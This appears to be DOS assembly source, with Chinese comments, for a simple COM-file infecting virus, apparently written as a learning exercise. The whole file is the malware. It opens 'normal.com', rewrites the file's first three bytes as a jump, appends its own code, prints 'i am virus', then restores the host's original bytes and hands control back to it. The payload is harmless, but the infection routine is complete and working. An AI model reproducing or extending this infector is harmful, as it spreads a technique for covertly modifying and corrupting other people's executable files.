org 100h

push	bp
mov	bp,sp
sub	sp,LocalVarSize

;打开文件，文件号保存在ax中
mov	ax,3d02h
mov	dx,FileName
int 	21h
mov	[bp-hFile],ax

;读文件头三个字节
mov 	bx,[bp-hFile]
mov	cx,3
mov	dx,Normal3
mov	ah,3fh
int 	21h

;读取文件大小
mov	ax,4202h
mov	cx,0
mov	dx,0
mov	bx,[bp-hFile]
int 	21h
mov	[bp-pFileSize],ax

;扩充被感染文件的大小
mov	bx,[bp-hFile]
mov	si,VirusSize
loop1:
mov	cx,1
mov	dx,Buf
mov	ah,40h
int 	21h
dec	si
jnz	loop1

;修改感染文件头3字节
;移动文件指针到头
mov	ax,4200h
mov	cx,0
mov	dx,0
mov	bx,[bp-hFile]
int	21h
;第一字节
mov bx, [bp-hFile]
mov cx, 1
mov dx, VirusJmp
mov ah, 40h
int 21h

;第二字节
mov bx, [bp-hFile]
mov cx, 1
push 	si
mov	si,[bp-pFileSize]
sub	si,3
mov	[bp-VirusJmpLong],si
mov	si,bp
sub	si,VirusJmpLong
mov dx, si;dx保存的必须是地址,不能是传送的值
pop	si
mov ah, 40h
int 21h

;第三字节

mov bx, [bp-hFile]
mov cx, 1
mov dx, Buf
mov ah, 40h
int 21h

;移动文件指针到感染程序的末尾
mov	ax,4200h
mov	cx,0
mov	dx,[bp-pFileSize]
mov	bx,[bp-hFile]
int	21h

;把病毒代码写入感染程序的末尾
mov	bx,[bp-hFile]
mov	cx,VirusSize
mov	dx,VirusStart
mov	ah,40h
int	21h



end:
add sp, LocalVarSize
pop bp
ret

VirusStart:
;重定位
call	base
base:
pop	bp
sub	bp,base
push 	bp;保存bp

;打印字符串
 mov	ax, Message
 add	ax,bp;加上相对偏移
 mov	bp, ax	
 mov	cx, 10		
 mov	ax, 1301h
mov	bx, 000ch 
	mov	dl, 0
	int	10h	

pop	bp;恢复bp为相对偏移


mov	di,$$
mov	si,Normal3
add	si,bp
mov	bx,di
mov	cx,3
movestart:	;复制前三字节
mov	al,[si]
mov	[di],al
inc	si
inc	di
dec	cx
jnz	movestart

jmp	bx

Message: db "i am virus"
Normal3: db "000"
VirusEnd:


hFile equ 2
pFileSize equ hFile + 2 
VirusJmpLong equ pFileSize+2
LocalVarSize equ VirusJmpLong
Buf: db 0
VirusSize equ VirusEnd-VirusStart
FileName:db "normal.com",0
VirusJmp: db 0xe9